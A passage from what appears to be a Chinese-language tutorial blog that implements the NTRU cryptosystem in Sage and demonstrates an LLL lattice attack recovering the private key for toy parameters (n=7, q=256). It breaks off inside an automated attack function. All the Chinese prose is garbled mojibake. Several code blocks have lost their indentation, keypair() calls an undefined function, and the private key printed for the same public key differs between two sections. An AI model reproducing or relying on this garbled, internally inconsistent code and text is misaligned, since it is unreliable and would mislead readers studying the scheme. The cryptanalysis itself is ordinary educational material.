class="number">3</span>)</span><br><span class="line">f3</span><br><span class="line"><span class="comment"># output: x^6 + 2*x^4 + x</span></span><br><span class="line">convolution(f,f3)</span><br><span class="line"><span class="comment"># output: 3*x^6 - 3*x^5 + 3*x^4 + 1</span></span><br></pre></td></tr></table></figure><p><code>convolution</code>çš„ç»“æœå¯ä»¥çœ‹æˆ$1 + 3 \cdot u$, å…¶ä¸­$u = x^6 - x^5 + x^4$</p><p>äº‹å®ä¸Šåœ¨æ¨¡éç´ æ•°çš„æ—¶å€™ä¹Ÿæ˜¯å¯èƒ½ç®—å‡ºç»“æœçš„, ä½†æ˜¯ç”±äº<code>invertmodprime</code>ä½¿ç”¨äº†<code>Sage</code>ä¸­çš„å­ç¨‹åº?(subroutines), ä»¥è‡³äºè¯¥å‡½æ•°ä¼šæ²¡é‚£ä¹ˆå¥½çš„å¤„ç†éç´ æ•°æ¨¡.</p><h2 id="æ¨¡-2-n-çš„é™¤æ³•"><a href="#æ¨¡-2-n-çš„é™¤æ³•" class="headerlink" title="æ¨¡$2^n$çš„é™¤æ³•"></a>æ¨¡$2^n$çš„é™¤æ³•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodpowerof2</span>(<span class="params">f,q</span>):</span></span><br><span class="line">     <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">     g = invertmodprime(f,<span class="number">2</span>)</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       r = balancedmod(convolution(g,f),q)</span><br><span class="line">       <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">       g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è·Ÿä¸Šé¢çš„<code>invertmodprime</code>å¾ˆåƒ, å”¯ä¸€çš„ä¸åŒæ˜¯è¾“å…¥$q$æ˜¯$2^n$, æ¯”å¦‚$2,4,8,16,â€¦$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br><span class="line">fq = invertmodpowerof2(f,q)</span><br><span class="line">convolution(f,fq)</span><br><span class="line"><span class="comment"># output: -256*x^6 + 256*x^4 - 256*x ^2 + 257</span></span><br></pre></td></tr></table></figure><p><code>convolution</code>çš„ç»“æœå¯ä»¥çœ‹æˆ$1 + 256 \cdot u$, å…¶ä¸­$u = x^6 + x^4 - x^2 + 1$</p><blockquote><p>è¿™é‡Œä¾æ—§æœ‰ä¸ªæ•°å­¦ç»ƒä¹ </p></blockquote><h2 id="NTRU-å¯†é’¥ç”Ÿæˆ"><a href="#NTRU-å¯†é’¥ç”Ÿæˆ" class="headerlink" title="NTRU å¯†é’¥ç”Ÿæˆ"></a>NTRU å¯†é’¥ç”Ÿæˆ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypair</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = randomdpoly()</span><br><span class="line">f3 = invertmodprime(f,<span class="number">3</span>)</span><br><span class="line">fq = invertmodpowerof(f,q)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">g = randomdpoly()</span><br><span class="line">publickey = balancedmod(<span class="number">3</span> * convolution(fq,g),q)</span><br><span class="line">secretkey = f,f3</span><br><span class="line"><span class="keyword">return</span> publickey,secretkey</span><br></pre></td></tr></table></figure><p><code>keypair()</code>ä¼šç”Ÿæˆä¸€ä¸ªå…¬é’¥<code>h</code>å’Œå¯¹åº”çš„ç§é’¥<code>f,f3</code>. å…¬é’¥çœ‹èµ·æ¥å°±åƒä¸€ä¸ªéšæœºçš„$\mod q$çš„$n$ç³»æ•°å¤šé¡¹å¼. æ¯”å¦‚è¯´, å¦‚æœ$n = 7, q = 256$, é‚£ä¹ˆå…¬é’¥çœ‹èµ·æ¥å°±åƒä¸€ä¸ª7ä¸ªéšæœºçš„å­—èŠ‚?(bytes):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">publickey, secretkey = keypair()</span><br><span class="line">publickey</span><br><span class="line"><span class="comment"># output: 54*x^6 - 40*x^5 + 90*x^4 + 101*x^3 - 108*x^2 + 80*x + 76</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸€ä¸ªç§é’¥$f$æ˜¯ä¸€ä¸ªæœ‰å°ç³»æ•°çš„å¤šé¡¹å¼, å°†$f$ä¸å…¬é’¥$h$å·ç§¯å†$\mod q$èƒ½ç”Ÿæˆå¦å¤–ä¸€ä¸ªå°ç³»æ•°çš„å¤šé¡¹å¼, ä¹Ÿå°±æ˜¯å‡ºç°åœ¨å¯†é’¥ç”Ÿæˆé‡Œçš„$3 \cdot g$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f,f3 &#x3D; secretkey</span><br><span class="line">f</span><br><span class="line"># output:-x^6 + x^5 - x^4 + x^2 + 1</span><br><span class="line">convolution(f, publickey)</span><br><span class="line"># output: 256*x^6 + 3*x^5 - 3*x^3 - 3*x^2 + 253*x - 253</span><br><span class="line">balancedmod(_,q)</span><br><span class="line"># output: 3*x^5 - 3*x^3 - 3*x^2 - 3*x + 3</span><br></pre></td></tr></table></figure><h2 id="ç”¨äºåŠ å¯†çš„æ¶ˆæ¯"><a href="#ç”¨äºåŠ å¯†çš„æ¶ˆæ¯" class="headerlink" title="ç”¨äºåŠ å¯†çš„æ¶ˆæ¯"></a>ç”¨äºåŠ å¯†çš„æ¶ˆæ¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randommessage</span>():</span></span><br><span class="line">result = <span class="built_in">list</span>(randrange(<span class="number">3</span>) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"><span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ª$n$ä¸ªç³»æ•°ä¸º$\{1,0,-1\}$çš„å¤šé¡¹å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^6 - x^5 + x^4</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: x^6 + x^5 - x^4 - 1</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^4 - x^3 - x + 1</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^6 + x^4 - x^2 + 1</span></span><br></pre></td></tr></table></figure><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message,publickey</span>):</span></span><br><span class="line">     r = randomdpoly()</span><br><span class="line">     <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,q)</span><br></pre></td></tr></table></figure><p>åŠ å¯†å‡½æ•°è¾“å…¥ä¸€ä¸ªéœ€è¦åŠ å¯†çš„æ¶ˆæ¯å’Œå…¬é’¥$h$, è¾“å‡ºçš„å¯†æ–‡ä¸º$h \cdot r + m \mod x^{n - 1} \mod q$,å…¶ä¸­$m$æ˜¯æ¶ˆæ¯, $r$æ˜¯éšæœºçš„ä¸€ä¸ªå¤šé¡¹å¼.</p><p>ä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">h,secretkey = keypair()</span><br><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">m = randommessage()</span><br><span class="line">m</span><br><span class="line"><span class="comment"># output: -x^6 - x^4 + x^2 + 1</span></span><br><span class="line">c = encrypt(m,h)</span><br><span class="line">c</span><br><span class="line"><span class="comment"># output: -66*x^6 + 37*x^5 + 115*x^4 - 15*x^3 - 6*x^2 - 89*x + 27</span></span><br></pre></td></tr></table></figure><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext,secretkey</span>):</span></span><br><span class="line">     f,f3 = secretkey</span><br><span class="line">     a = balancedmod(convolution(ciphertext,f),q)</span><br><span class="line">     <span class="keyword">return</span> balancedmod(convolution(a,f3),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>è§£å¯†å‡½æ•°éœ€è¦è¾“å…¥å¯†æ–‡å’Œç§é’¥</p><blockquote><p>è¿™é‡Œä½œè€…æµ‹è¯•äº†ä¸€ä¸‹è§£å¯†ç®—æ³•, å°±çŸ¥è¯†ç®€å•çš„é‡å¤åŠ å®Œå¯†å†è§£å¯†, è¿™éƒ¨åˆ†å°±ä¸å†™ä¸‹æ¥äº†.</p></blockquote><p>ä¸‹é¢è¿™ä¸ªä¾‹å­å°±æ˜¯åŠ è§£å¯†çš„æ—¶å€™å‡½æ•°å†…éƒ¨çš„æ‰€æœ‰è¿‡ç¨‹, ç”¨æ¥è¯´æ˜è§£å¯†çš„æ­£ç¡®æ€§:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">h,secretkey = keypair()</span><br><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">m = randommessage()</span><br><span class="line">m</span><br><span class="line"><span class="comment"># output: x^6 + x^5 - x^4 - x^3 + x - 1</span></span><br><span class="line">r = randomdpoly()</span><br><span class="line">r</span><br><span class="line"><span class="comment"># output: -x^6 + x^5 + x^4 + x^3 - x^2</span></span><br><span class="line">f = secretkey[<span class="number">0</span>]</span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^6 - x^5 - x^4 - x^3 - x</span></span><br><span class="line">g3 = balancedmod(convolution(f,h),q)</span><br><span class="line">g3</span><br><span class="line"><span class="comment"># output: -3*x^6 - 3*x^3 + 3*x^2 - 3*x - 3</span></span><br><span class="line">c = balancedmod(convolution(h,r) + m,q)</span><br><span class="line">c</span><br><span class="line"><span class="comment"># output: -93*x^6 - 105*x^5 - 110*x^4 - 95*x^3 - 106*x^2 </span></span><br><span class="line">a = balancedmod(convolution(f,c),q)</span><br><span class="line">a</span><br><span class="line"><span class="comment"># output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3</span></span><br><span class="line">convolution(g3,r) + convolution(f,m)</span><br><span class="line"><span class="comment"># output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3</span></span><br><span class="line">balancedmod(a,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 - x^2 - x</span></span><br><span class="line">balancedmod(convolution(f,m),<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 - x^2 - x</span></span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹è¿‡ç¨‹,<br>$$<br>c = h \cdot r + m \mod q \\<br>f \cdot h = 3 \cdot g \mod q<br>$$<br>æ‰€ä»¥æˆ‘ä»¬æœ‰:<br>$$<br>a = f \cdot c = f \cdot h \cdot r + f \cdot m = 3 \cdot g \cdot r + f \cdot m \mod q<br>$$<br>å¤šé¡¹å¼$g,r,f,m$çš„ç³»æ•°éƒ½ç‰¹åˆ«çš„å°, æ‰€ä»¥è¿™é‡Œå¯¹$3 \cdot g \cdot r + f \cdot m$ç³»æ•°çš„æœ€å¤§å€¼æœ‰é™åˆ¶. åªæœ‰å½“è¿™ä¸ªé™åˆ¶è¶³å¤Ÿå°, å°åˆ°$a \mod q$å°±æ˜¯$3 \cdot g \cdot r + f \cdot m$, è¿™ä¸ªæ—¶å€™$\mod 3$è§„çº¦$a$å°±æ˜¯åœ¨è®¡ç®—$f \cdot m \mod 3$, æœ€åå†ä¹˜$f3$å°±èƒ½å¾—åˆ°$m \mod 3$äº†</p><p>æ³¨æ„åˆ°è§£å¯†æ˜¯æœ‰å¯èƒ½å¤±è´¥çš„, æœ‰ä¸€ä¸ªåŠæ³•é¿å…å¯¹æœ‰æ•ˆå¯†æ–‡çš„è§£å¯†å¤±è´¥å°±æ˜¯æ ‡å‡†åŒ–$n,d,q$çš„é€‰å–, ä½†æ˜¯æ”»å‡»è€…ä»ç„¶å¯ä»¥æ•…æ„é€‰æ‹©æ— æ•ˆå¯†æ–‡æ¥æŸ¥çœ‹è§£å¯†æ˜¯å¦å¯ä»¥æ­£å¸¸è¿›è¡Œ. æ‰€ä»¥ä¸ºäº†å®‰å…¨é‡‡å–é¢å¤–çš„æªæ–½æŠµæŠ—è¿™ç§é€‰æ‹©å¯†æ–‡æ”»å‡»æ˜¯å¾ˆé‡è¦çš„!</p><h2 id="ä¸€ä¸ªå¯¹å‚æ•°è¿‡å°çš„NTRUçš„æ”»å‡»å®ä¾‹"><a href="#ä¸€ä¸ªå¯¹å‚æ•°è¿‡å°çš„NTRUçš„æ”»å‡»å®ä¾‹" class="headerlink" title="ä¸€ä¸ªå¯¹å‚æ•°è¿‡å°çš„NTRUçš„æ”»å‡»å®ä¾‹"></a>ä¸€ä¸ªå¯¹å‚æ•°è¿‡å°çš„NTRUçš„æ”»å‡»å®ä¾‹</h2><p>åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­, å‚æ•°å°†ä½¿ç”¨$n = 7,d = 5,q = 256$</p><p>æ”»å‡»è€…å°†ä¼šä»å…¬é’¥$h = 3 \cdot g / f$å…¥æ‰‹. æˆ‘ä»¬å¯ä»¥è®¡ç®—$h3 = g / f$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">Integers(q)(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: 171</span></span><br><span class="line">h3 = (<span class="number">171</span> * h)%q</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æŠŠ$g$çœ‹æˆæ˜¯ç§é’¥$f$ä¹˜$h3$. è®°ä½, ç§é’¥$f$æ˜¯ä»$1,x,x^2,x^3,x^4,x^5,x^6$é€šè¿‡ä¸€äº›åŠ å‡å¾—åˆ°çš„. é‚£ä¹ˆ$g$å¯¹åº”çš„å°±æ˜¯ä»$h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$é€šè¿‡ä¸€äº›åŠ å‡å¾—åˆ°çš„.ä¸‹é¢æ˜¯è¿™äº›å¤šé¡¹å¼:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">h3</span><br><span class="line"><span class="comment"># output: 58*x^6 + 210*x^5 + 54*x^4 + 36*x^3 + 194*x^2 + 130*x + 87</span></span><br><span class="line">convolution(h3,x)</span><br><span class="line"><span class="comment"># output: 210*x^6 + 54*x^5 + 36*x^4 + 194*x^3 + 130*x^2 + 87*x + 58</span></span><br><span class="line">convolution(h3,x^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># output: 54*x^6 + 36*x^5 + 194*x^4 + 130*x^3 + 87*x^2 + 58*x + 210</span></span><br><span class="line">convolution(h3,x^<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: 36*x^6 + 194*x^5 + 130*x^4 + 87*x^3 + 58*x^2 + 210*x + 54</span></span><br><span class="line">convolution(h3,x^<span class="number">4</span>)</span><br><span class="line"><span class="comment"># output: 194*x^6 + 130*x^5 + 87*x^4 + 58*x^3 + 210*x^2 + 54*x + 36</span></span><br><span class="line">convolution(h3,x^<span class="number">5</span>)</span><br><span class="line"><span class="comment"># output: 130*x^6 + 87*x^5 + 58*x^4 + 210*x^3 + 54*x^2 + 36*x + 194</span></span><br><span class="line">convolution(h3,x^<span class="number">6</span>)</span><br><span class="line"><span class="comment"># output: 87*x^6 + 58*x^5 + 210*x^4 + 54*x^3 + 36*x^2 + 194*x + 130</span></span><br></pre></td></tr></table></figure><p>äº‹å®ä¸Š, $g = f\cdot h3 \mod q$, $q$ å¯ä»¥ä»ä»»æ„çš„å‚æ•°é€šè¿‡åŠ å‡å¾—åˆ°. è¿™æ„å‘³ç€$g$å¯ä»¥ä»$q,q\cdot x,q\cdot x^2,q\cdot x^3,q\cdot x^4,q\cdot x^5,q\cdot x^6,h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$ç»„åˆè€Œæ¥</p><p>æœ€å, è¿æ¥ä¸Šé¢çš„è¿™äº›ç³»æ•°å¹¶å°†äº§ç”Ÿçš„ç»„åˆå†™è¿›ä¸‹é¢çš„çŸ©é˜µä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">M = Matrix(<span class="number">2</span>*n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n): M[i,i] = q</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n,<span class="number">2</span>*n): M[i,i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">M[i+n,j] = convolution(h3, x^i)[j]</span><br><span class="line">M</span><br><span class="line"><span class="comment"># output: [256   0   0   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0 256   0   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0 256   0   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0 256   0   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0 256   0   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0   0 256   0   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0   0   0   0   0   0 256   0   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 87 130 194  36  54 210  58   1   0   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 58  87 130 194  36  54 210   0   1   0   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [210  58  87 130 194  36  54   0   0   1   0   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 54 210  58  87 130 194  36   0   0   0   1   0   0   0]</span></span><br><span class="line"><span class="comment"># output: [ 36  54 210  58  87 130 194   0   0   0   0   1   0   0]</span></span><br><span class="line"><span class="comment"># output: [194  36  54 210  58  87 130   0   0   0   0   0   1   0]</span></span><br><span class="line"><span class="comment"># output: [130 194  36  54 210  58  87   0   0   0   0   0   0   1]</span></span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨LLLç®—æ³•å¯ä»¥å¿«é€Ÿçš„æ‰¾å‡ºè¡Œç»„åˆå‡ºæ¥çš„çŸ­å‘é‡.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">M.LLL()</span><br><span class="line"><span class="comment"># output: [ -1  -1   1  -1   1   0   0  -1   1  -1  -1   1   0   0]</span></span><br><span class="line"><span class="comment"># output: [  0  -1  -1   1  -1   1   0   0  -1   1  -1  -1   1   0]</span></span><br><span class="line"><span class="comment"># output: [  1  -1   1  -1   0   0   1  -1   1   1  -1   0   0   1]</span></span><br><span class="line"><span class="comment"># output: [ -1   1  -1   0   0   1   1   1   1  -1   0   0   1  -1]</span></span><br><span class="line"><span class="comment"># output: [  1  -1   0   0   1   1  -1   1  -1   0   0   1  -1   1]</span></span><br><span class="line"><span class="comment"># output: [  1   1   1   1   1   1   1   1   1   1   1   1   1   1]</span></span><br><span class="line"><span class="comment"># output: [  0   0   1   1  -1   1  -1   0   0   1  -1   1   1  -1]</span></span><br><span class="line"><span class="comment"># output: [ 39 -28  19  12  11 -48  -4  47   6 -31 -20 -19  36 -18]</span></span><br><span class="line"><span class="comment"># output: [ -5 -34 -14  -3   9 -39 -43  47  54  22   1 -17  19   1]</span></span><br><span class="line"><span class="comment"># output: [  4 -39  28 -19 -12 -11  48  18 -47  -6  31  20  19 -36]</span></span><br><span class="line"><span class="comment"># output: [  9 -40 -43  -5 -32 -13  -1 -17  20   1  47  54  23   3]</span></span><br><span class="line"><span class="comment"># output: [ -1   9 -40 -43  -5 -32 -13   3 -17  20   1  47  54  23]</span></span><br><span class="line"><span class="comment"># output: [ 14   3  -9  40  43   4  32 -22  -3  17 -18  -1 -48 -54]</span></span><br><span class="line"><span class="comment"># output: [ 28 -19 -12 -11  48   4 -39  -6  31  20  19 -36  18 -47]</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¯¦ç»†çš„è§£é‡Šä¸€ä¸‹, å› ä¸ºå¤šé¡¹å¼gçš„ç³»æ•°å°±æ˜¯ç”±$q,q\cdot x,q\cdot x^2,q\cdot x^3,q\cdot x^4,q\cdot x^5,q\cdot x^6,h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$è¿™äº›é¡¹çš„ç³»æ•°çº¿æ€§ç»„åˆè€Œæ¥çš„, çŸ©é˜µMå·¦ä¸‹è§’é‚£ä¸€å—å°±æ˜¯h3å¯èƒ½å‡ºç°çš„ç³»æ•°çš„æ’åˆ—, å·¦ä¸Šè§’ä¸€å—æ˜¯qå’Œ$x^n$ç›¸ä¹˜çš„ç³»æ•°(å…¶å®å°±æ˜¯q), è¿™äº›è¡Œå‘é‡è¿›è¡Œçº¿æ€§ç»„åˆçš„ç»“æœä¸­, è‚¯å®šå­˜åœ¨$g$çš„ç³»æ•°, è€Œåˆå› ä¸º$g$çš„ç³»æ•°éƒ½æ˜¯å¾ˆå°çš„$\{1,0,-1\}$, æ‰€ä»¥åˆ©ç”¨æ ¼åŸºè§„çº¦, å¯ä»¥æŠŠå‘é‡$g$è§„çº¦å‡ºæ¥.</p></blockquote><p>ç¬¬ä¸€è¡Œçš„å°±æ˜¯$f$å¯¹åº”çš„$g$, äº‹å®ä¸Š, å¦‚æœ$f$çš„è´Ÿæ•°é‚£ä¹ˆäº§ç”Ÿçš„ä¹Ÿæ˜¯$g$çš„è´Ÿæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">M.LLL()[<span class="number">0</span>][n:]</span><br><span class="line"><span class="comment"># output: (-1, 1, -1, -1, 1, 0, 0)</span></span><br><span class="line">Zx(<span class="built_in">list</span>(_))</span><br><span class="line"><span class="comment"># output: x^4 - x^3 - x^2 + x - 1</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ”»å‡»è€…ä»ç„¶å¯ä»¥è§£å¯†ä¸”ä¸è€ƒè™‘è´Ÿæ•°. åŒæ ·çš„, LLL å¯ä»¥äº§ç”Ÿèƒ½å¤Ÿæ­£å¸¸ç”¨äºè§£å¯†çš„$x \cdot f$å’Œ$x \cdot g$, æ‰€ä»¥å¯¹äºNTRUæ–¹æ¡ˆ, éœ€è¦æ›´å¤§çš„å‚æ•°$n$æ¥ä¿è¯å®ƒçš„å®‰å…¨æ€§.</p><h2 id="è‡ªåŠ¨åŒ–æ”»å‡»"><a href="#è‡ªåŠ¨åŒ–æ”»å‡»" class="headerlink" title="è‡ªåŠ¨åŒ–æ”»å‡»"></a>è‡ªåŠ¨åŒ–æ”»å‡»</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">publickey</span>):</span></span><br><span class="line">  recip3 = lift(<span class="number">1</span>/Integers(q)(<span class="number">3</span>))</span><br><span class="line">  publickeyover3 = balancedmod(recip3 * publickey,q)</span><br><span class="line">  M = matrix(<span class="number">2</span> * 